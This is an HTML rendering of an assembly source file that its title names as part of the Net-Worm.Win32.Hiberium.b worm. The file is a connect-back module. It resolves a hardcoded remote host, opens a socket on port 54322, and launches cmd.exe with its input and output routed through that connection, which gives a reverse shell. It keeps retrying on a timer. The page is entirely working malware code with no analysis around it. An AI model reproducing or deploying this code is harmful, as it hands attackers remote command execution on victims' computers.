<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Net-Worm.Win32.Hiberium.b - Cback.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc9">CPU</span><span class="sc0"> </span><span class="sc2">386</span><span class="sc0">
</span><span class="sc4">[</span><span class="sc9">BITS</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc9">section</span><span class="sc0"> </span><span class="sc5">.rdata</span><span class="sc0">

</span><span class="sc5">CBACK_HOST</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'wmchar.undo.it'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


</span><span class="sc9">section</span><span class="sc0"> </span><span class="sc10">.text</span><span class="sc0"> </span><span class="sc5">execute</span><span class="sc0">

</span><span class="sc9">%xdefine</span><span class="sc0">        </span><span class="sc5">CBACK_TIMEOUT</span><span class="sc0">   </span><span class="sc4">((</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">60</span><span class="sc4">)*</span><span class="sc2">1000</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;8 min.</span><span class="sc0">
</span><span class="sc9">%xdefine</span><span class="sc0">        </span><span class="sc5">CBACK_CHK_CONN</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc2">10</span><span class="sc4">*</span><span class="sc2">1000</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;10 sec.</span><span class="sc0">
</span><span class="sc9">%xdefine</span><span class="sc0">        </span><span class="sc5">CBACK_PORT</span><span class="sc0">  </span><span class="sc2">54322</span><span class="sc0">



</span><span class="sc5">@Cback</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc0">

</span><span class="sc9">%define</span><span class="sc0">     </span><span class="sc5">_WSASocket</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MTX_CBACK</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WaitForSingleObject</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">.exit</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">STR_WS2_32</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetModuleHandle</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">.ws2</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LoadLibrary</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc9">.exit</span><span class="sc0">

</span><span class="sc5">.ws2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">STR_WSASocket</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc9">.exit</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_WSASocket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">.gethost</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">CBACK_HOST</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gethostbyname</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc9">.exit</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0xC</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;ip</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc4">|</span><span class="sc0"> </span><span class="sc4">((((</span><span class="sc5">CBACK_PORT</span><span class="sc0"> </span><span class="sc4">&lt;&lt;</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">&amp;</span><span class="sc0"> </span><span class="sc2">0xFF00</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">|</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">CBACK_PORT</span><span class="sc0"> </span><span class="sc4">&gt;&gt;</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">&amp;</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc4">))</span><span class="sc0"> </span><span class="sc4">&lt;&lt;</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc4">)</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc5">_WSASocket</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">connect</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">.createprocess</span><span class="sc0">

</span><span class="sc5">.retry</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">closesocket</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">CBACK_TIMEOUT</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc5">CBACK_CHK_CONN</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">.sleep</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">CBACK_CHK_CONN</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CONNECTED</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc9">.exit</span><span class="sc0">

    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">.sleep</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">.gethost</span><span class="sc0">

</span><span class="sc9">.exit</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MTX_CBACK</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ReleaseMutex</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitThread</span><span class="sc0">


</span><span class="sc5">.createprocess</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">0x11</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x44</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0x44</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x2c</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;STARTF_USESHOWWINDOW</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x2d</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;STARTF_USESTDHANDLES</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x38</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;TRUE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">STR_CMD</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateProcess</span><span class="sc0">

    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WaitForSingleObject</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">.retry</span><span class="sc0">
</span></div></body>
</html>
